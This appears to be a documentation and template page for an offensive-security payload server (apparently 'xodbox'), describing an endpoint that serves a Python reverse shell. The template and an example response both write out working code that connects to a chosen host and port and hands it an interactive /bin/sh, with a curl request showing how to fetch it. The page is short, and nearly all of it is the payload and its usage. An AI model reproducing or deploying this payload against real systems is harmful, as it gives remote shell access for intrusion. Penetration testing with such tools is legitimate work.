---
title: Python Reverse Shell
description: Python Reverse Shell
weight: 1
pattern: /rsh/python$
is_final: true
data:
  headers:
    Content-Type: text/plain
  body: |
    {{- $client := index .Request.RemoteAddr 0}}
    {{- $clientSplit := split ":" $client }}
    {{- $connectHost := $clientSplit._0 }}
    {{- $connectPort := 9091 }}
    {{- if .Request.GetParams.h }}
    {{- $connectHost = (index .Request.GetParams.h 0) }} 
    {{- end -}}
    {{- if .Request.GetParams.p }}
    {{- $connectPort = (index .Request.GetParams.p 0) }} 
    {{- end -}}
    import socket,os,pty;
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    s.connect(("{{ $connectHost }}",{{ $connectPort }}));
    os.dup2(s.fileno(),0);
    os.dup2(s.fileno(),1);
    os.dup2(s.fileno(),2);
    pty.spawn("/bin/sh")
    


---


Useful for reverse shells on busybox systems.

### Example Request

Params

| Parameter | Default Value     | Description        |
|-----------|-------------------|--------------------|
| h         | Client IP address | Host to connect to |
| p         | 9091              | Port to connect to |


```bash
curl -i "http://xodbox.test/rsh/python?h=10.10.10.10&p=9090"
```

### Example Response

```python
import socket,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("127.0.0.1",9091));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn("/bin/sh")
```

